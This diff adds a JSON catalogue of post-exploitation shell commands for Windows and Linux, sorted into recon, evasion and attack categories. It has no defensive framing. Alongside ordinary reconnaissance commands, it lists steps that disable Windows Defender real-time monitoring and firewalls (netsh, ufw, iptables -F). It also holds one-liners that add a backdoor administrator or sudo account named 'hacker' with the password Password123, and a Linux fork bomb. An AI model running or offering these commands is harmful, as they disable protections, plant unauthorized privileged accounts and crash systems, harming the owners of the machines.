@@ -1,0 +1,104 @@
+[    
+  {
+      "category":"recon",
+      "name":"system data",
+      "command":"systeminfo",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"network configuration",
+      "command":"ipconfig /all",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"arp cache",
+      "command":"arp -a",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"routing table",
+      "command":"route print",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"active connections",
+      "command":"netstat -aon",
+      "sys":"windows"
+    },
+    {
+      "category":"evasion",
+      "name":"disable realtime monitoring",
+      "command":"Set-MpPreference -DisableRealtimeMonitoring $true",
+      "sys":"windows"
+    },
+    {
+      "category":"evasion",
+      "name":"disable firewall",
+      "command":"netsh advfirewall set allprofiles state off",
+      "sys":"windows"
+    },
+    {
+      "category":"attack",
+      "name":"add user",
+      "command":"net user hacker Password123 /add && net localgroup administrators hacker /add",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"shared folders",
+      "command":"net share",
+      "sys":"windows"
+    },
+    {
+      "category":"recon",
+      "name":"system information",
+      "command":"uname -a",
+      "sys":"linux"
+    },
+    {
+      "category":"recon",
+      "name":"network interfaces",
+      "command":"ifconfig -a || ip addr",
+      "sys":"linux"
+    },
+    {
+      "category":"recon",
+      "name":"routing table",
+      "command":"route -n || ip route",
+      "sys":"linux"
+    },
+    {
+      "category":"recon",
+      "name":"active connections",
+      "command":"netstat -tulnp || ss -tulnp",
+      "sys":"linux"
+    },
+    {
+      "category":"recon",
+      "name":"process list",
+      "command":"ps aux",
+      "sys":"linux"
+    },
+    {
+      "category":"evasion",
+      "name":"disable firewall",
+      "command":"ufw disable || iptables -F",
+      "sys":"linux"
+    },
+    {
+      "category":"attack",
+      "name":"add user",
+      "command":"useradd -m -p $(openssl passwd -1 Password123) hacker && usermod -aG sudo hacker",
+      "sys":"linux"
+    },
+    {
+      "category":"attack",
+      "name":"fork bomb",
+      "command":":(){ : | : & }; :",
+      "sys":"linux"
+    }
+]
